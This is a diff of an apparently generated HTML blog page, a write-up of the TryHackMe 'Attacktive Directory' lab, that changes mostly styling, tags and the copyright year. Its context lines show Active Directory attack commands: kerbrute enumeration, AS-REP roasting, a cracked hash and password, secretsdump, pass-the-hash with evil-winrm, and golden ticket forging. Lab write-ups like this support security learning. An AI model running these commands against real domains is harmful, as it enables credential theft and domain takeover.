@@ -1649,12 +1649,12 @@
   <li>Privesc
     <ul>
       <li><a href="#secretsdump">Secretsdump</a></li>
-      <li><a href="#gettingflags">Getting flags</a></li>
+      <li><a href="#getting-flags">Getting flags</a></li>
     </ul>
   </li>
   <li>Bonus
     <ul>
-      <li><a href="#generate-golden-tickets">Generating Golden Tickets</a></li>
+      <li><a href="#generating-golden-tickets">Generating Golden Tickets</a></li>
     </ul>
   </li>
 </ol>
@@ -1790,7 +1790,7 @@ S-1-5-21-3591857110-2884097990-301047963-502 THM-AD<span class="se">\k</span>rbt
 </pre></td><td class="rouge-code"><pre>kerbrute usernum <span class="nt">--dc</span> <span class="s2">"</span><span class="nv">$TARGET_IP</span><span class="s2">"</span> <span class="nt">-d</span> <span class="s2">"</span><span class="nv">$DOMAIN_NAME</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$WORDLIST</span><span class="s2">"</span>
 </pre></td></tr></tbody></table></code></div></div>
 
-<p><a href="/assets/img/writeups/thm/attacktivedirectory/kerbrute.png" class="popup img-link shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/kerbrute.png" alt="kerbrute"  loading="lazy"></a>
+<p><a href="/assets/img/writeups/thm/attacktivedirectory/kerbrute.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/kerbrute.png" alt="kerbrute"  loading="lazy"></a>
 <em>Kerbrute found a few AD users</em></p>
 
 <p>I will put thoses usernames in a file before continuing:</p>
@@ -1853,7 +1853,7 @@ paradox
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>impacket-GetNPUsers <span class="nt">-dc-ip</span> <span class="nv">$TARGET_IP</span> <span class="s2">"</span><span class="nv">$DOMAIN_NAME</span><span class="s2">/"</span> <span class="nt">-usersfile</span> <span class="nv">$USERS_FOUND_WITH_KERBRUTE</span>
 </pre></td></tr></tbody></table></code></div></div>
-<p><a href="/assets/img/writeups/thm/attacktivedirectory/token_as_rep.png" class="popup img-link shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/token_as_rep.png" alt="as_rep"  loading="lazy"></a>
+<p><a href="/assets/img/writeups/thm/attacktivedirectory/token_as_rep.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/token_as_rep.png" alt="as_rep"  loading="lazy"></a>
 <em>svc-admin is ASRepRoastable</em></p>
 
 <p>And use john to crack this kerberos AS-REP:</p>
@@ -1863,7 +1863,7 @@ paradox
 </pre></td><td class="rouge-code"><pre>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:542ffcaff5ff973571221ce247639de5$5c015375d1747520c65cfd0e274742646078ed1bbc30bf1e9dd63fa32be9d663e62ec8271864c9ba8fa7a299f3802b2faff8dfd6d1684682eb82d8a22b6da935f890fa490ba3767331584e16c4622407ab473e2c190a22a470e9fed5750a49234d0099b44f9e0f180c96e492d614bc137226a8f872c4c731a6ab03ef88ced8014c32e180d8b7afcd404602d8bad7a6bcda4b97107aef337ab9192ffcc7c23a6f8b6f9101cc006d39c2188c1aa4fc31d87bde8737465ee6d31a13d36538b9381143d295a158a6602792d48fbf4119028f9ca7b233def4de701fa339d8eb332ec9fcb9c4b6662710a72bf35601d0b7d79c7aaa
 </pre></td></tr></tbody></table></code></div></div>
 
-<p><a href="/assets/img/writeups/thm/attacktivedirectory/john.png" class="popup img-link shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/john.png" alt="as_rep"  loading="lazy"></a>
+<p><a href="/assets/img/writeups/thm/attacktivedirectory/john.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/john.png" alt="as_rep"  loading="lazy"></a>
 <em>Bingo !</em></p>
 
 <h5 id="answering-questions-2"><span class="me-2">Answering questions</span><a href="#answering-questions-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5>
@@ -1901,7 +1901,7 @@ paradox
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>smbclient <span class="nt">-L</span> <span class="s2">"//10.10.60.35/"</span> <span class="nt">-U</span> <span class="s2">"svc-admin%management2005"</span>
 </pre></td></tr></tbody></table></code></div></div>
-<p><a href="/assets/img/writeups/thm/attacktivedirectory/smbclient_as_svc_admin.png" class="popup img-link shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/smbclient_as_svc_admin.png" alt="as_rep"  loading="lazy"></a>
+<p><a href="/assets/img/writeups/thm/attacktivedirectory/smbclient_as_svc_admin.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/smbclient_as_svc_admin.png" alt="as_rep"  loading="lazy"></a>
 <em>We have access to 6 shares now</em></p>
 
 <p><strong>What do we learn from the <code class="language-plaintext highlighter-rouge">smbclient</code> output ?</strong></p>
@@ -1950,7 +1950,7 @@ paradox
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>smbclient <span class="s2">"//10.10.60.35/backup"</span> <span class="nt">-U</span> <span class="s2">"svc-admin%management2005"</span>
 </pre></td></tr></tbody></table></code></div></div>
-<p><a href="/assets/img/writeups/thm/attacktivedirectory/smbclient_get_data.png" class="popup img-link shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/smbclient_get_data.png" alt="as_rep"  loading="lazy"></a></p>
+<p><a href="/assets/img/writeups/thm/attacktivedirectory/smbclient_get_data.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/smbclient_get_data.png" alt="as_rep"  loading="lazy"></a></p>
 
 <div file="backup_credentials.txt" class="language-plaintext highlighter-rouge"><div class="code-header">
         <span data-label-text="backup_credentials.txt"><i class="far fa-file-code fa-fw"></i></span>
@@ -2025,7 +2025,7 @@ backup@spookysec.local:backup2517860
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>impacket-secretsdump <span class="nt">-just-dc</span> <span class="s2">"</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USERNAME</span><span class="s2">:</span><span class="nv">$PASSWORD</span><span class="s2">@</span><span class="nv">$TARGET_IP</span><span class="s2">"</span>
 </pre></td></tr></tbody></table></code></div></div>
-<p><a href="/assets/img/writeups/thm/attacktivedirectory/secrets_dump.png" class="popup img-link shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/secrets_dump.png" alt="as_rep"  loading="lazy"></a>
+<p><a href="/assets/img/writeups/thm/attacktivedirectory/secrets_dump.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/secrets_dump.png" alt="as_rep"  loading="lazy"></a>
 <em>And we get all the NTLM hashes</em></p>
 
 <div file="hashes.text" class="language-plaintext highlighter-rouge"><div class="code-header">
@@ -2081,10 +2081,10 @@ The hashes are in the format LM:NT, so the response is <code class="language-pla
 </pre></td><td class="rouge-code"><pre>evil-winrm <span class="nt">-i</span> <span class="s2">"</span><span class="nv">$TARGET</span><span class="s2">"</span> <span class="nt">-u</span> <span class="s2">"</span><span class="nv">$USERNAME</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s2">"</span><span class="nv">$NT_HASH</span><span class="s2">"</span> 
 </pre></td></tr></tbody></table></code></div></div>
 
-<p><a href="/assets/img/writeups/thm/attacktivedirectory/exploit.png" class="popup img-link shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/exploit.png" alt="as_rep"  loading="lazy"></a>
+<p><a href="/assets/img/writeups/thm/attacktivedirectory/exploit.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/exploit.png" alt="as_rep"  loading="lazy"></a>
 <em>We succesfully used the pass-the-hash method to authenticate as admin</em></p>
 
-<p><a href="/assets/img/writeups/thm/attacktivedirectory/flags.png" class="popup img-link shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/flags.png" alt="as_rep"  loading="lazy"></a>
+<p><a href="/assets/img/writeups/thm/attacktivedirectory/flags.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/flags.png" alt="as_rep"  loading="lazy"></a>
 <em>And we can display grab the 3 flags</em></p>
 
 <h1 id="bonus">Bonus</h1>
@@ -2123,7 +2123,7 @@ S-1-5-21-3591857110-2884097990-301047963
             <span class="nt">-domain</span> <span class="nv">$DOMAIN_NAME</span> <span class="se">\</span>
             <span class="nv">$USERNAME</span>
 </pre></td></tr></tbody></table></code></div></div>
-<p><a href="/assets/img/writeups/thm/attacktivedirectory/golden_ticket.png" class="popup img-link shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/golden_ticket.png" alt="as_rep"  loading="lazy"></a>
+<p><a href="/assets/img/writeups/thm/attacktivedirectory/golden_ticket.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/golden_ticket.png" alt="as_rep"  loading="lazy"></a>
 <em>We’ve succesfully generated a Golden Ticket</em></p>
 
 <p>Next we need to export a variable that will store the path to the generated Golden Ticket</p>
@@ -2136,7 +2136,7 @@ S-1-5-21-3591857110-2884097990-301047963
 
 <p>Finally, we can use whatever script for the impacket suite that we wan’t, using the <code class="language-plaintext highlighter-rouge">-k -no-pass</code> options to specify that we wan’t to authenticate using the kerberos ticket:</p>
 
-<p><a href="/assets/img/writeups/thm/attacktivedirectory/golden_ticket_working.png" class="popup img-link shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/golden_ticket_working.png" alt="as_rep"  loading="lazy"></a>
+<p><a href="/assets/img/writeups/thm/attacktivedirectory/golden_ticket_working.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/thm/attacktivedirectory/golden_ticket_working.png" alt="as_rep"  loading="lazy"></a>
 <em>We are connected as admin without having to authenticate</em></p>
 
   </div>
@@ -2431,82 +2431,6 @@ S-1-5-21-3591857110-2884097990-301047963
     
     
     
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
   
     
     
@@ -2561,6 +2485,58 @@ S-1-5-21-3591857110-2884097990-301047963
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
       
         
         
@@ -2605,7 +2581,66 @@ S-1-5-21-3591857110-2884097990-301047963
     
     
     
+  
+    
+    
+    
+    
       
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
     
   
     
@@ -2792,10 +2827,10 @@ S-1-5-21-3591857110-2884097990-301047963
         <a class="post-tag btn btn-outline-primary" href="/tags/golden-ticket/">golden-ticket</a>
       
         
-        <a class="post-tag btn btn-outline-primary" href="/tags/impacket/">impacket</a>
+        <a class="post-tag btn btn-outline-primary" href="/tags/hacking/">hacking</a>
       
         
-        <a class="post-tag btn btn-outline-primary" href="/tags/kerberos/">kerberos</a>
+        <a class="post-tag btn btn-outline-primary" href="/tags/impacket/">impacket</a>
       
     </div>
   </section>
@@ -2967,7 +3002,7 @@ S-1-5-21-3591857110-2884097990-301047963
   "
 >
   <p>©
-    <time>2024</time>
+    <time>2025</time>
 
     
       <a href="https://github.com/NullBrunk">Anas</a>.
@@ -3096,82 +3131,6 @@ S-1-5-21-3591857110-2884097990-301047963
     
     
     
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
   
     
     
@@ -3226,6 +3185,58 @@ S-1-5-21-3591857110-2884097990-301047963
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
       
         
         
@@ -3270,7 +3281,66 @@ S-1-5-21-3591857110-2884097990-301047963
     
     
     
+  
+    
+    
+    
+    
       
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
     
   
     
@@ -3457,10 +3527,10 @@ S-1-5-21-3591857110-2884097990-301047963
         <a class="post-tag btn btn-outline-primary" href="/tags/golden-ticket/">golden-ticket</a>
       
         
-        <a class="post-tag btn btn-outline-primary" href="/tags/impacket/">impacket</a>
+        <a class="post-tag btn btn-outline-primary" href="/tags/hacking/">hacking</a>
       
         
-        <a class="post-tag btn btn-outline-primary" href="/tags/kerberos/">kerberos</a>
+        <a class="post-tag btn btn-outline-primary" href="/tags/impacket/">impacket</a>
       
     </div>
   </section>
